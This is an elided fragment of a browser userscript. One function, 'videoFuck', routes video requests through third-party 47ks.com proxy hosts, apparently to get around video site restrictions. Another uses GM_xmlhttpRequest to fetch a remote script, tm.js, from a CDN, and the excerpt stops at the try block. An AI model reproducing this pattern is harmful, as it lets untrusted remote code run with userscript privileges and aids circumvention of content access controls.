...
(function(gmUtils, MutationObserver){
    ...
    function startFeaturesByConfig(){
        ...
        function videoFuck(){
            var hackHostUrlPrefix = ("https:" == document.location.protocol)?('https://api.47ks.com/robots.txt?v=') : 'http://p2.api.47ks.com/webcloud/?v=';
...
'</div>'
    ...
    function renderVmData(){
        ...
        GM_xmlhttpRequest({
            method: 'GET',
            url: 'http://xjthree.qiniudn.com/tm.js?t=' + new Date(new Date().format("yyyy/MM/dd HH:mm:00")).getTime(),
            headers: {},
            onload: function(response) {
                if (response.status === 200) {
                    try{
